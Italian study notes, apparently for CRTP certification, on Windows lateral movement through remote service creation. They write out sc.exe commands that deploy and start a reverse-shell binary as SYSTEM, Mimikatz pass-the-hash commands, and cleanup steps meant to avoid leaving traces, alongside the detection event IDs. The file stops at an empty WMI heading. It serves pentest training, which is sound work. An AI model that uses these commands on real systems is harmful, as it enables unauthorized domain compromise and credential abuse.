- [Lateral Movement](#lateral-movement)
  - [Service](#service)

# Lateral Movement

## Service
### Cosa fa SCM
SCM (services.exe) è il processo Windows che gestisce tutti i servizi — li avvia, li ferma, li registra nel registry. Espone un'interfaccia RPC raggiungibile remotamente sulla porta 445 (SMB). Se hai credenziali amministrative sulla macchina target, puoi parlare con il suo SCM da remoto.

### Il flusso dell'attacco
- Step 1 — hai le credenziali di un local admin su TARGET (magari le hai rubate con Mimikatz o hai fatto PTH).
- Step 2 — carichi il tuo eseguibile malevolo su TARGET. Devi prima copiarlo da qualche parte accessibile:
    ```
    # Copi la reverse shell su TARGET via SMB
    copy reverse_shell.exe \\TARGET\C$\Windows\Temp\malicious.exe
    ```
- Step 3 — crei il servizio su TARGET tramite SCM remoto:
    ```
    sc.exe \\TARGET create malicious_service binPath= "C:\Windows\Temp\malicious.exe" start= auto
    ```
    Questo scrive una chiave nel registry di TARGET sotto:
    ```
    HKLM\SYSTEM\CurrentControlSet\Services\malicious_service
    ```
- Step 4 — avvii il servizio:
    ```
    sc.exe \\TARGET start malicious_service
    ```
SCM avvia il binario come SYSTEM — il livello di privilegio più alto sulla macchina. La tua reverse shell si connette al tuo listener.

### Perché gira come SYSTEM
Per default SCM avvia i nuovi servizi nel contesto di LOCAL ```SYSTEM``` a meno che non specifichi diversamente con il parametro ```obj=```. Questo è un vantaggio enorme — non ottieni solo accesso alla macchina, ottieni direttamente SYSTEM.
```
# Senza specificare obj= → gira come SYSTEM (default)
sc.exe \\TARGET create malicious_service binPath= "C:\Windows\Temp\malicious.exe"

# Se volessi farlo girare come un utente specifico
sc.exe \\TARGET create malicious_service binPath= "C:\Windows\Temp\malicious.exe" obj= "corp\mario" password= "Password123!"
```

### Cosa serve perché funzioni
Devi avere accesso SMB sulla porta 445 di TARGET e credenziali amministrative. Puoi usare sia credenziali in chiaro che PTH:
```
# Con credenziali in chiaro — impersoni l'utente prima
runas /user:corp\administrator cmd

# Con PTH — inietti l'hash e poi usi sc.exe normalmente
Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:corp.local /ntlm:<hash> /run:cmd.exe"'
# Nella nuova finestra cmd usi sc.exe normalmente
sc.exe \\TARGET create malicious_service binPath= "C:\Windows\Temp\malicious.exe"
```

### Pulizia dopo l'attacco
Nei pentest reali e nella CRTP è importante fare pulizia per non lasciare tracce:
```
# Fermi il servizio
sc.exe \\TARGET stop malicious_service

# Elimini il servizio dal registry
sc.exe \\TARGET delete malicious_service

# Elimini il binario
del \\TARGET\C$\Windows\Temp\malicious.exe
```

### Perché è rumoroso
Creare un servizio genera diversi eventi nel Windows Event Log di TARGET:
```
Event ID 7045  →  nuovo servizio installato
Event ID 7036  →  servizio avviato/fermato
Event ID 4697  →  servizio installato (Security log)
```
Qualsiasi SOC con un SIEM decente vede immediatamente un nuovo servizio creato su una macchina. Per questo nelle operazioni reali si preferiscono tecniche più silenziose come WMI, PSRemoting, o scheduled tasks — ma nella CRTP è un metodo valido per muoversi lateralmente rapidamente.


### runas /user:corp\administrator cmd
Apre un nuovo terminale cmd sul tuo PC corrente, ma nel contesto di sicurezza di ```corp\administrator```. Da quel terminale quando usi ```sc.exe \\TARGET``` il tuo PC si autentica a ```TARGET``` usando le credenziali di ```corp\administrator``` che hai inserito.
```
il tuo PC → si autentica a TARGET come corp\administrator → SCM di TARGET accetta
```

### sekurlsa::pth — quale hash inietti
Inietti l'hash dell'utente che è amministratore su TARGET — che può essere:
- un domain admin — è amministratore su tutte le macchine del dominio per default:
    ```
    # Hash di un DA → funziona su qualsiasi macchina del dominio
    Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:corp.local /ntlm:<hash-DA>"'
    ```
- un local admin di TARGET — funziona solo su quella macchina specifica:
    ```
    # Hash del local Administrator di TARGET → funziona solo su TARGET
    Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:TARGET /ntlm:<hash-local-admin-TARGET>"'
    ```
- un utente di dominio che è local admin su TARGET — magari l'hai scoperto con Find-LocalAdminAccess:
    ```
    # Hash di svc-web che è local admin su TARGET
    Invoke-Mimikatz -Command '"sekurlsa::pth /user:svc-web /domain:corp.local /ntlm:<hash-svc-web>"'
    ```
##### La cosa importante
In entrambi i casi — runas e pth — stai aprendo un terminale sul tuo PC corrente con un'identità diversa. Non sei ancora su TARGET. Usi quel terminale per parlare remotamente con TARGET tramite sc.exe, SMB, WMI, ecc.
```
Il tuo PC (identità = corp\administrator)
        ↓
sc.exe \\TARGET ...
        ↓
TARGET riceve la richiesta → verifica che corp\administrator sia admin → esegue
```

## Windows Management Implementation (WMI)
